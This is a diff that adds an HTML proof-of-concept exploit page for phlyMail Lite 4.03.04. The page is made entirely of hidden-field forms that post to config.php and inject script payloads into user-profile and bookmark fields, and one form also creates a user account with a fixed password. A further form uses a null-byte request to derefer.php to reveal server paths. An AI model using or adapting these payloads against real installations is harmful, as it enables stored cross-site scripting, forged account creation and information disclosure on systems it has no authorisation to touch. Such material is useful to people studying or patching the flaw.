@@ -1,0 +1,52 @@
+<html>
+<head>
+<title>phlyLabs phlyMail Lite 4.03.04 Path Disclosure and Stored XSS Vulnerabilities</title>
+</head>
+<body><center><br />
+ 
+<form method="POST" action="http://www.example.com/config.php?action=users&whattodo=savenewuser">
+<input type="hidden" name="MOTD" value="ZSL" />
+<input type="hidden" name="PHM[active]" value="1" />
+<input type="hidden" name="PHM[cellular]" value='"><script>alert(1);</script>' />
+<input type="hidden" name="PHM[customer_number]" value='"><script>alert(2);</script>' />
+<input type="hidden" name="PHM[email]" value='"><script>alert(3);</script>' />
+<input type="hidden" name="PHM[externalemail]" value='"><script>alert(4);</script>' />
+<input type="hidden" name="PHM[fax]" value='"><script>alert(5);</script>' />
+<input type="hidden" name="PHM[firstname]" value='"><script>alert(6);</script>' />
+<input type="hidden" name="PHM[lastname]" value='"><script>alert(7);</script>' />
+<input type="hidden" name="PHM[password2]" value="django" />
+<input type="hidden" name="PHM[password]" value="django" />
+<input type="hidden" name="PHM[tel_business]" value='"><script>alert(8);</script>' />
+<input type="hidden" name="PHM[tel_private]" value='"><script>alert(9);</script>' />
+<input type="hidden" name="PHM[visibility]" value="private" />
+<input type="hidden" name="PHM[www]" value='"><script>alert(10);</script>' />
+<input type="hidden" name="debugging_level" value="0" />
+<input type="hidden" name="language" value="en" />
+<input type="hidden" name="sessioncookie" value="0" />
+<input type="hidden" name="sessionip" value="0" />
+<input type="hidden" name="showmotd" value="1" />
+<input type="hidden" name="theme" value="Yokohama" />
+<input type="hidden" name="uid" value='"><script>alert(11);</script>' />
+<input type="submit" value="XSS #1" />
+</form>
+ 
+<br />
+ 
+<form method="POST" action="http://www.example.com/config.php?action=view&screen=bookmarks&module=Bookmarks&do=edititem&save=1&id=1">
+<input type="hidden" name="desc" value="ZSL" />
+<input type="hidden" name="group" value="1" />
+<input type="hidden" name="is_favourite" value="1" />
+<input type="hidden" name="name" value='"><script>alert(12);</script>' />
+<input type="hidden" name="url" value='"><script>alert(13);</script>' />
+<input type="submit" value="XSS #2" />
+</form>
+ 
+<br />
+ 
+<form method="GET" action="http://www.example.com/frontend/derefer.php?go=joxy%00">
+<input type="submit" value="PD #1" />
+</form>
+ 
+</center></body>
+</html>
+
